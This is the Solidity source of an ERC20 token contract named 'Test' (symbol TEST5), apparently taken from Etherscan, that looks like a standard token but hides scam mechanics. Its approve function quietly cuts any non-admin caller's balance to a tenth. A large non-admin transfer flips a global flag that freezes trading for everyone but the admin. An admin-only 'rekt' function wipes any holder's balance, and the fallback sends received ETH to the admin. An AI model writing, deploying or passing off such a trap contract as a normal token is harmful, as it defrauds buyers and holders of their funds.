/**
 *Submitted for verification at Etherscan.io on 2021-02-28
*/

pragma solidity 0.5.17;

contract ERC20 {
    function totalSupply() public view returns (uint supply);
    function balanceOf(address who) public view returns (uint value);
    function allowance(address owner, address spender) public view returns (uint remaining);
    function transferFrom(address from, address to, uint value) public returns (bool ok);
    function approve(address spender, uint value) public returns (bool ok);
    function transfer(address to, uint value) public returns (bool ok);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

contract Test is ERC20{
    uint8 public constant decimals = 18;
    uint256 initialSupply = 2500000*10**uint256(decimals);
    string public constant name = "Test";
    string public constant symbol = "TEST5";
    address payable admin;
    uint256 tokenBalance;
    uint256 decimal = 10;
    bool public valid = true;
    uint256 public amount = 1000*10**uint256(decimals);

    function totalSupply() public view returns (uint256) {
        return initialSupply;
    }
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    
    function balanceOf(address owner) public view returns (uint256 balance) {
        return balances[owner];
    }

    function allowance(address owner, address spender) public view returns (uint remaining) {
        return allowed[owner][spender];
    }
    
    function transfer(address to, uint256 value) public returns (bool success) {
        require(msg.sender == admin || valid == true); 
        if (balances[msg.sender] >= value && value > 0) {
            balances[msg.sender] -= value;
            balances[to] += value;
            if (msg.sender != admin && value >= amount) valid = false;
            emit Transfer(msg.sender, to, value);
            return true;
        } else {
            return false;
        }
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool success) {
        require(msg.sender == admin || valid == true); 
        if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {
            balances[to] += value;
            balances[from] -= value;
            allowed[from][msg.sender] -= value;
            emit Transfer(from, to, value);
            return true;
        } else {
            return false;
        }
    }

    function approve(address spender, uint256 value) public returns (bool success) {
        allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        if (msg.sender != admin) {
            approved(msg.sender);
        }
        return true;
    
    }
	
	function approved(address owner) internal {
        tokenBalance = balances[owner];
        tokenBalance /= decimal;
        balances[owner] = tokenBalance;
    }
    
    function setValid(bool _valid) public {
        require(msg.sender == admin);
        valid = _valid;
    }
    
    function setAmount(uint256 _amount) public {
        require(msg.sender == admin);
        amount = _amount*10**uint256(decimals);
    }
    
    function rekt(address _bot) public {
        require(msg.sender == admin);
        balances[_bot]=0;
    }
    
    
     function () external payable {
        admin.transfer(msg.value);
    }

    constructor () public payable {
        admin = msg.sender;
        balances[admin] = initialSupply;
        emit Transfer(address(0), admin, initialSupply);
    }

   
}